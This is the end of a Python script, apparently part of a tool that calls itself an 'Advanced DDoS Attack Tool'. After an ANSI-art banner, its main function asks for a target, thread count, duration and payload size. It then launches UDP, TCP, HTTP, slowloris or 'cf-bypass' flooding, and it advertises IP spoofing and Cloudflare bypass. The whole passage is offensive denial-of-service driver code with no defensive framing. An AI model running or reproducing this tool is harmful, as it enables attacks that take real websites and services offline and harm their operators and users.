\x1b[0;31m░\x1b[0;97m \x1b[0;31m░▒\x1b[0;97m \x1b[0;31m▒░\x1b[0;37m \x1b[0;97m \x1b[0;31m▒\x1b[0;97m \x1b[0;31m░\x1b[0;37m \x1b[0;31m░\x1b[0;97m \x1b[0;31m░\x1b[0;97m \x1b[0;31m▒\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;31m░\x1b[0;97m \x1b[0;31m░\x1b[0;97m \x1b[0;31m▒\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;31m ░\x1b[0;97m \x1b[0;31m░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;97m  \x1b[0;31m░▒\x1b[0;97m \x1b[0;31m░\x1b[0;97m \x1b[0;31m▒░\x1b[0;37m \x1b[0;31m░\x1b[0;97m \x1b[0;31m░▒\x1b[0;97m  \x1b[0;31m░\x1b[0;97m \x1b[0;31m░\x1b[0;37m \x1b[0;31m ░\x1b[0;97m \x1b[0;31m░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;31m  \x1b[0;97m \x1b[0;31m░\x1b[0;97m  \x1b[0;31m▒\x1b[0;37m   \x1b[0m
\x1b[0;31m░\x1b[0;97m \x1b[0;31m░░\x1b[0;97m \x1b[0;31m░\x1b[0;37m  \x1b[0;97m \x1b[0;31m▒\x1b[0;97m \x1b[0;31m░\x1b[0;37m \x1b[0;97m  \x1b[0;31m░\x1b[0;97m \x1b[0;31m░\x1b[0;37m    \x1b[0;97m  \x1b[0;31m░\x1b[0;97m \x1b[0;31m░\x1b[0;37m    \x1b[0;31m  \x1b[0;97m  \x1b[0;31m░\x1b[0;37m    \x1b[0;97m  \x1b[0;31m░░\x1b[0;97m   \x1b[0;31m░\x1b[0;37m  \x1b[0;31m░\x1b[0;97m \x1b[0;31m ░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m   \x1b[0;31m  \x1b[0;97m  \x1b[0;31m░\x1b[0;37m    \x1b[0;31m░\x1b[0;37m        \x1b[0m
\x1b[0;31m░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m    \x1b[0;97m \x1b[0;31m░\x1b[0;37m   \x1b[0;97m    \x1b[0;31m░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;97m    \x1b[0;31m░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;97m   \x1b[0;31m░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;97m   \x1b[0;31m░\x1b[0;37m      \x1b[0;97m      \x1b[0;31m░\x1b[0;37m   \x1b[0;97m   \x1b[0;31m░\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;31m░\x1b[0;97m \x1b[0;31m░\x1b[0;37m      \x1b[0m
\x1b[0;37m                                                                   \x1b[0;31m░\x1b[0;37m        \x1b[0m
"""
    print(banner)

def main():
    try:
        print_banner()
        print("=== Advanced DDoS Attack Tool ===")
        print("Features: User-Agent rotation, Header rotation, Path rotation")
        print("Supports: IP addresses, hostnames, URLs (http:// or https://)")
        print("Methods: udp, tcp, http, slowloris, cf-bypass")
        print("Extras: IP spoofing, Cloudflare bypass\n")

        target_input = input("Enter target (IP, hostname, or URL): ").strip()
        print(f"[1] Target input: {target_input}")

        # Parse target - can be IP, hostname, or URL
        target, port, scheme = parse_target(target_input)
        print(f"[2] Parsed target: {target}:{port} ({scheme})")

        threads = int(input("Enter number of threads: ").strip())
        print(f"[3] Threads: {threads}")

        requests = int(input("Enter number of requests (0 for unlimited): ").strip())
        print(f"[4] Requests: {requests}")

        duration = int(input("Enter duration in seconds (0 for unlimited): ").strip())
        print(f"[5] Duration: {duration}")

        byte_size = int(input("Enter payload size in bytes (max 60000 for UDP): ").strip())
        print(f"[6] Byte size: {byte_size}")

        method = input("Enter attack method (udp/tcp/http/slowloris/cf-bypass): ").strip().lower()
        print(f"[7] Method: {method}")

        if method not in ["udp", "tcp", "http", "slowloris", "cf-bypass"]:
            print("[-] Invalid method. Using UDP.")
            method = "udp"

        # For HTTP attacks, suggest using http method for URLs
        if target_input.startswith(('http://', 'https://')) and method in ['udp', 'tcp']:
            print(f"[!] URL detected - consider using 'http' or 'cf-bypass' method for web attacks")

        print("[8] Validating target...")
        if not validate_target(target):
            print(f"[-] Invalid target: {target}")
            return

        if port < 1 or port > 65535:
            print("[-] Invalid port number")
            return

        print("[9] Creating attack object...")
        rotator = UserAgentRotator()
        attack = DDoSAttack(target, port, threads, requests, byte_size, duration, rotator, scheme)

        print(f"\n[*] Starting {method.upper()} attack on {target}:{port}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Requests: {'Unlimited' if requests == 0 else requests}")
        print(f"[*] Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
        print(f"[*] Payload size: {byte_size} bytes")
        print(f"[*] User agents: {len(rotator.user_agents)}")
        print(f"[*] Header templates: {len(rotator.headers_pool)}")
        print(f"[*] Paths: {len(rotator.paths)}\n")

        print("[10] Calling attack.start()...")
        attack.start(method)

        print("[11] Waiting for threads to start...")
        time.sleep(1)

        print(f"[12] Active threads: {len(attack.attack_threads)}")
        print(f"[13] Attack running: {attack.running}\n")

        if duration > 0:
            print(f"[14] Running for {duration} seconds...")
            while (time.time() - attack.start_time) < duration and attack.running:
                time.sleep(0.1)
        else:
            print("[14] Running indefinitely (Ctrl+C to stop)...")
            while attack.running:
                time.sleep(0.1)

        attack.running = False
        print("\n[+] Attack completed")
        for thread in attack.attack_threads:
            thread.join(timeout=2)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
